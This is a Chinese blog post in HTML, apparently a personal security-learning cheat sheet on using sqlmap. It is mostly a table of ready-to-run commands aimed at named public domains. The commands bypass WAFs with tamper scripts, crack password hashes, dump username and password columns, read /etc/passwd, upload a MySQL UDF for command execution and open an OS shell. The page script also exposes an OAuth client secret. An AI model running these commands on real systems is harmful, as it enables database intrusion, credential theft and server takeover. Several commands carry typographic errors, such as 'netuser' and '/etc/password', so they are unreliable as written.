+<td align="center">–batch 在使用sqlmap时，有时一些响应需要用户交互，输入Y、N、skip、quit等，使用此选项可使用默认配置。  –output-dir=  指定输出路径，方式控制台输出过多，无法查看，也方便记录  –gpage=GOOGLEPAGE  好像默认是使用google搜索的前100个文件，当使用前面的-g参数，配合此参数指定页面  –identify-waf  进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别  –mobile  使用移动产品UA，把sqlmap伪装成手机，也可使用前面的 -user-agent 自己指定  –smart  智能深度启发式扫描，或许会有惊喜呢。  –wizard 和上面的完全不同，纯新手选择，一步步让你输入url等参数，基本输入个url就行。</td>
+</tr>
+</tbody></table>
+<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><table>
+<thead>
+<tr>
+<th align="center"><strong>1</strong></th>
+<th align="center">手工基本检测和判断（在注入点使用or、and等可判断是否有注入点）</th>
+<th align="center">原始网页：<a target="_blank" rel="noopener" href="http://www.potian.com/mysql/product/user_info.php?uid=1">http://www.potian.com/mysql/product/user_info.php?uid=1</a> 024 构造url1：<a target="_blank" rel="noopener" href="http://www.potian.com/mysql/product/user_info.php?uid=1">http://www.potian.com/mysql/product/user_info.php?uid=1</a> 024+AND+1=1 构造url2：<a target="_blank" rel="noopener" href="http://www.potian.com/mysql/product/user_info.php?uid=1">http://www.potian.com/mysql/product/user_info.php?uid=1</a> 024+AND+1=1 025</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>2</strong></td>
+<td align="center">基础检测语法</td>
+<td align="center">sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.potian.com/mysql/product/user_info.php?uid=1">http://www.potian.com/mysql/product/user_info.php?uid=1</a> 024</td>
+</tr>
+<tr>
+<td align="center"><strong>3</strong></td>
+<td align="center">批量检测</td>
+<td align="center">“sqlmap.py -m target.txt”，注意target.txt跟sqlmap在同一个目录下。</td>
+</tr>
+<tr>
+<td align="center"><strong>4</strong></td>
+<td align="center">绕过WAF进行SQL注入</td>
+<td align="center">（1）修改\sqlmap\tamper\halfversionedmorekeywords.py return match.group().replace(word, ”/<em>!0%s” % word) 为：return match.group().replace(word, ”/</em>!50000%s*/” % word)  （2）修改\sqlmap\xml\queries.xml &lt;cast query= ”CAST(%s ASCHAR)”/&gt;为：&lt;castquery=                ”convert(%s,CHAR)”/&gt;  （3）使用sqlmap进行注入测试sqlmap.py -u ”<a target="_blank" rel="noopener" href="http://www.potian.com/detail.php">http://www.potian.com/detail.php</a>? id=16″ –tamper “halfversionedmorekeywords.py”  其它绕过waf脚本方法：sqlmap.py-u “ <a target="_blank" rel="noopener" href="http://www.potian.com/mysql/product/user_info.php?uid=1">http://www.potian.com/mysql/product/user_info.php?uid=1</a> 024”                –tampertamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3  （4）tamper目录下文件具体含义： space2comment.py 用/<strong>/代替空格 apostrophemask.py 用utf8代替引号 equaltolike.pylike 代替等号 space2dash.py 绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）  greatest.py 绕过过滤’&gt;’ ，用GREATEST替换大于号。 space2hash.py  空格替换为#号,随机字符串以及换行符  apostrophenullencode.py  绕过过滤双引号，替换字符和双引号。  halfversionedmorekeywords.py  当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论  space2morehash.py  空格替换为#号 以及更多随机字符串 换行符  appendnullbyte.py   在有效负荷结束位置加载零字节字符编码  ifnull2ifisnull.py 绕过对IFNULL过滤，替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’ space2mssqlblank.py(mssql) 空格替换为其它空符号  base64encode.py 用base64编码替换  space2mssqlhash.py 替换空格  modsecurityversioned.py  过滤空格，包含完整的查询版本注释  space2mysqlblank.py 空格替换其它空白符号(mysql)  between.py  用between替换大于号（&gt;） space2mysqldash.py  替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）  multiplespaces.py  围绕SQL关键字添加多个空格  space2plus.py  用+替换空格  bluecoat.py  代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like  nonrecursivereplacement.py 双重查询语句，取代SQL关键字  space2randomblank.py  代替空格字符（“”）从一个随机的空白字符可选字符的有效集  sp_password.py  追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾  chardoubleencode.py  双url编码(不处理以编码的)  unionalltounion.py  替换UNION ALLSELECT UNION SELECT  charencode.py url编码  randomcase.py   随机大小写  unmagicquotes.py  宽字符绕过  GPCaddslashes randomcomments.py  用/</strong>/分割sql关键字  charunicodeencode.py  字符串unicode编码  securesphere.py  追加特制的字符串  versionedmorekeywords.py  注释绕过 space2comment.py  替换空格字符串(‘‘) 使用注释‘/**/’  halfversionedmorekeywords.py   关键字前加注释</td>
+</tr>
+<tr>
+<td align="center"><strong>5</strong></td>
+<td align="center">URL重写SQL注入测试</td>
+<td align="center">value1为测试参数，加“*”即可，sqlmap将会测试value1的位置是否可注入。 sqlmap.py -u ” <a target="_blank" rel="noopener" href="http://www.potian.com/param1/value1">http://www.potian.com/param1/value1</a> */param2/value2/”</td>
+</tr>
+<tr>
+<td align="center"><strong>6</strong></td>
+<td align="center">列举并破解密码哈希值</td>
+<td align="center">当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。 sqlmap.py -u ” <a target="_blank" rel="noopener" href="http://www.potian.com/sqlmap/pgsql/get_int.php?id=1">http://www.potian.com/sqlmap/pgsql/get_int.php?id=1</a> ” –passwords -v1</td>
+</tr>
+<tr>
+<td align="center"><strong>7</strong></td>
+<td align="center">获取表中的数据个数</td>
+<td align="center">sqlmap.py -u ” <a target="_blank" rel="noopener" href="http://www.potian.com/sqlmap/mssql/iis/get_int.asp?id=1">http://www.potian.com/sqlmap/mssql/iis/get_int.asp?id=1</a> ” –count -Dtestdb</td>
+</tr>
+<tr>
+<td align="center"><strong>8</strong></td>
+<td align="center">站点爬取</td>
+<td align="center">sqlmap.py -u “ <a target="_blank" rel="noopener" href="http://www.secbang.com/">http://www.secbang.com</a> “–batch –crawl=3</td>
+</tr>
+<tr>
+<td align="center"><strong>9</strong></td>
+<td align="center">注入时间预估（基于布尔）</td>
+<td align="center">sqlmap.py -u “ <a target="_blank" rel="noopener" href="http://www.secbang.com/sqlmap/oracle/get_int_bool.php?id=1">http://www.secbang.com/sqlmap/oracle/get_int_bool.php?id=1</a> “-b –eta</td>
+</tr>
+<tr>
+<td align="center"><strong>10</strong></td>
+<td align="center">使用hex避免字符编码导致数据丢失</td>
+<td align="center">sqlmap.py -u “ <a target="_blank" rel="noopener" href="http://www.secbang.com/pgsql/get_int.php?id=1">http://www.secbang.com/pgsql/get_int.php?id=1</a> ” –banner –hex -v 3 –parse-errors</td>
+</tr>
+<tr>
+<td align="center"><strong>11</strong></td>
+<td align="center">模拟测试手机环境站点</td>
+<td align="center">python sqlmap.py -u ” <a target="_blank" rel="noopener" href="http://www.secbang.com/vuln.php?id=1">http://www.secbang.com/vuln.php?id=1</a> ” –mobile</td>
+</tr>
+<tr>
+<td align="center"><strong>12</strong></td>
+<td align="center">智能判断测试</td>
+<td align="center">sqlmap.py -u “ <a target="_blank" rel="noopener" href="http://www.secbang.com/info.php?id=1">http://www.secbang.com/info.php?id=1</a> “–batch –smart</td>
+</tr>
+<tr>
+<td align="center"><strong>13</strong></td>
+<td align="center">结合burpsuite进行注入</td>
+<td align="center">sqlmap.py -r burpsuite 抓包.txt</td>
+</tr>
+<tr>
+<td align="center"><strong>14</strong></td>
+<td align="center">sqlmap 自动填写表单注入</td>
+<td align="center">sqlmap.py -u URL –forms sqlmap.py -u URL –forms –dbs sqlmap.py -u URL –forms –current-db sqlmap.py -u URL –forms -D 数据库名称–tables sqlmap.py -u URL –forms -D 数据库名称 -T 表名 –columns sqlmap.py -u URL –forms -D 数据库名称 -T 表名 -Cusername，password –dump</td>
+</tr>
+<tr>
+<td align="center"><strong>15</strong></td>
+<td align="center">读取linux下文件</td>
+<td align="center">sqlmap.py-u “url” –file /etc/password</td>
+</tr>
+<tr>
+<td align="center"><strong>16</strong></td>
+<td align="center">sqlmap cookies 注入</td>
+<td align="center">sqlmap.py -u “ <a target="_blank" rel="noopener" href="http://www.potian.com/mysql/product/user_info.php?uid=1">http://www.potian.com/mysql/product/user_info.php?uid=1</a> 024“–cookies “ssuid=*″ –dbs –level 3 sqlmap.py -u 注入点URL –cookie”id=xx” –level 3 sqlmap.py -u                url –cookie “id=xx”–level 3 –tables( 猜表名) sqlmap.py -u url –cookie “id=xx”–level 3 -T 表名 –coiumns sqlmap.py -u url –cookie “id=xx”–level 3 -T 表名 -C username，password –dump</td>
+</tr>
+<tr>
+<td align="center"><strong>17</strong></td>
+<td align="center">连接mysql数据打开一个交互shell</td>
+<td align="center">sqlmap.py -dmysql://potian:123123@<a target="_blank" rel="noopener" href="http://www.potian.com:3306/sqlmap">www.potian.com:3306/sqlmap</a> –sql-shell select @@version; select @@plugin_dir;</td>
+</tr>
+<tr>
+<td align="center"><strong>18</strong></td>
+<td align="center">利用sqlmap上传lib_mysqludf_sys到MySQL插件目录</td>
+<td align="center">sqlmap.py -dmysql://potian:123123@<a target="_blank" rel="noopener" href="http://www.potian.com:3306/sqlmap">www.potian.com:3306/sqlmap</a> –file-write=d:/tmp/lib_mysqludf_sys.dll–file-dest=d:\wamp2.5\bin\mysql\mysql5.6.17\lib\plugin\lib_mysqludf_sys.dll CREATE                FUNCTION sys_exec RETURNS STRINGSONAME ‘lib_mysqludf_sys.dll’ CREATE FUNCTION sys_eval RETURNS STRINGSONAME ‘lib_mysqludf_sys.dll’ select sys_eval(‘ver’);</td>
+</tr>
+<tr>
+<td align="center"><strong>19</strong></td>
+<td align="center">执行shell命令</td>
+<td align="center">sqlmap.py -u “url” –os-cmd=”netuser” /<em>执行net user命令</em>/ sqlmap.py -u “url” –os-shell /<em>系统交互的shell</em>/</td>
+</tr>
+<tr>
+<td align="center"><strong>20</strong></td>
+<td align="center">延时注入</td>
+<td align="center">sqlmap –dbs -u”url” –delay 0.5 /* 延时0.5秒*/ sqlmap –dbs -u”url” –safe-freq /* 请求2次*/</td>
+</tr>
+</tbody></table>
+<h2 id="跑流量包"><a href="#跑流量包" class="headerlink" title="跑流量包"></a>跑流量包</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap<span class="selector-class">.py</span> -r 流量包<span class="selector-class">.txt</span>  </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="useful"><a href="#useful" class="headerlink" title="useful"></a>useful</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53755216/article/details/118763451">https://blog.csdn.net/qq_53755216/article/details/118763451</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/godrun666/Advanced-SQL-Injection-Cheatsheet">godrun666/Advanced-SQL-Injection-Cheatsheet: A cheat sheet that contains advanced queries for SQL Injection of all types. (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/245314.html">说一说：Sqlmap参数 - FreeBuf网络安全行业门户</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>b1ue0cean
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2022/07/30/sqlmap/" title="sqlmap">http://example.com/2022/07/30/sqlmap/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://twitter.com/b1ue0cean7">
+          <span class="icon">
+            <i class="fab fa-twitter"></i>
+          </span>
+
+          <span class="label">Twitter</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class=""></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/sqlmap/" rel="tag"># sqlmap</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/30/HTB-Carrier/" rel="prev" title="HTB Carrier">
+                  <i class="fa fa-chevron-left"></i> HTB Carrier
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/07/31/nmap/" rel="next" title="nmap">
+                  nmap <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"godrun666","repo":"godrun666.github.io","client_id":"7f8a0f5a5c88a0fea952","client_secret":"57250fa3a3b4cb1d0e0dad43bb1fffe7355d61a8","admin_user":"godrun666","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"b1e00cf4762928899316b949a2998e3a"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
